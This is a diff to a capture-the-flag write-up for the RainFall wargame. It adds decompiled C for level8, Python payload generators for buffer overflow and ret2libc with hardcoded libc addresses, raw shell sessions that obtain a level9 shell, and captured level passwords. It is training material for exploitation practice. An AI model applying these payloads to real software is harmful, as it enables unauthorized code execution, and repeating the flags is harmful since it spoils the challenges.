@@ -1,3 +1,16 @@
+LEVEL_0:
+# 📚 Exploiting `level0`
+> scp -P 4242 level@192.168.0.111:/home/user/level/level ./level : copy binary file to host machine 
+```
+./level0 423
+$ cd ..
+$ cd level1 
+$ cat .pass 
+```
+```
+1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
+```
+
 LEVEL_1:
 # 📚 Exploiting `level1` – Exploit the overflow to get a shell.
     - get the system addr:
@@ -59,7 +72,6 @@ cat .pass</br>
 
 LEVEL_2:
 # 📚 Exploiting `level2` – Exploit the overflow to get a shell.
-> scp level2@192.168.0.114:/home/user/level2/level2 ./level2
 
 Since return-to-stack is blocked, we execute shellcode from the heap using strdup().
 
@@ -585,6 +597,139 @@ Segmentation fault (core dumped)
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
  - 1754601545
 
+LEVEL_8:
+# 📚 Exploiting `level8` 
 
+```
+int		main(void)
+{
+	char	buffer[128];
+	
+	while (1)
+	{
+		printf("%p, %p\n", auth, service);
+		if (fgets(buffer, 128, stdin) == 0)
+			break;
+		if (strncmp(buffer, "auth ", 5) == 0)
+		{
+			auth = malloc(4);
+			auth[0] = 0;
+			if (strlen(buffer + 5) <= 30)
+				strcpy(auth, buffer + 5);
+		}
+		if (strncmp(buffer, "reset", 5) == 0)
+			free(auth);
+		if (strncmp(buffer, "service", 6) == 0)
+			service = strdup(buffer + 7);
+		if (strncmp(buffer, "login", 5) == 0)
+		{
+			if (auth[32] != 0)
+				system("/bin/sh");
+			else
+				fwrite("Password:\n", 10, 1, stdout);
+		}
+	}
+}
+python - <<PY > /tmp/exploit
+from struct import pack
+OFF = 80            
+system = 0xb7e6b060
+ret_after_system = 0x41414141   # junk or address of exit()
+binsh = 0xb7f8cc58
+
+payload = b"A"*OFF
+payload += pack("<I", system)
+payload += pack("<I", ret_after_system)
+payload += pack("<I", binsh)
+payload += b"\n"
+open("/tmp/exploit","wb").write(payload)
+print("wrote /tmp/exploit, len=", len(payload))
+PY
+
+
+#!/usr/bin/env python3
+payload = b"auth AAAAAAAAAAAAAAAAAAAAAAAAAAAXXXX\n"
+payload += b"login\n"
+open("/tmp/exploit", "wb").write(payload)
+print("wrote /tmp/exploit, len=", len(payload))
+
+level8@RainFall:~$ ./level8 < /tmp/exploit
+(nil), (nil)
+0x804a008, (nil)
+0x804a008, 0x804a018
+Password:
+0x804a008, 0x804a018
+level8@RainFall:~$ cat /proc/sys/kernel/randomize_va_space
+0
+level8@RainFall:~$ (echo "auth AAAAAAAAAAAAAAAAAAAAAAAAAAAXXXX"; echo "login") | ./level8
+(nil), (nil)
+0x804a008, (nil)
+Password:
+0x804a008, (nil)
+level8@RainFall:~$
+
+level8@RainFall:~$ ./level8
+(nil), (nil)
+auth
+(nil), (nil)
+auth
+0x804a008, (nil)
+service0123456789abcdef
+0x804a008, 0x804a018
+login
+$ whoami
+level9
+$ ^C
+$ ^X^Z^Z^C
+$ exit
+0x804a008, 0x804a018
+exit
+0x804a008, 0x804a018
+^C
+level8@RainFall:~$ ./level8
+(nil), (nil)
+auth
+(nil), (nil)
+authx
+(nil), (nil)
+authrr
+(nil), (nil)
+authuuuu
+(nil), (nil)
+auth
+(nil), (nil)
+auth
+0x804a008, (nil)
+service0123456789
+0x804a008, 0x804a018
+login
+Password:
+0x804a008, 0x804a018
+kaka
+0x804a008, 0x804a018
+whoami
+0x804a008, 0x804a018
+^C
+level8@RainFall:~$ ./level8
+(nil), (nil)
+auth
+0x804a008, (nil)
+service
+0x804a008, 0x804a018
+login
+Password:
+0x804a008, 0x804a018
+^C
+level8@RainFall:~$ clear
+level8@RainFall:~$ ./level8
+(nil), (nil)
+auth
+0x804a008, (nil)
+service0123456789abcdef
+0x804a008, 0x804a018
+login
+$ whoami
+level9
+```
 
 
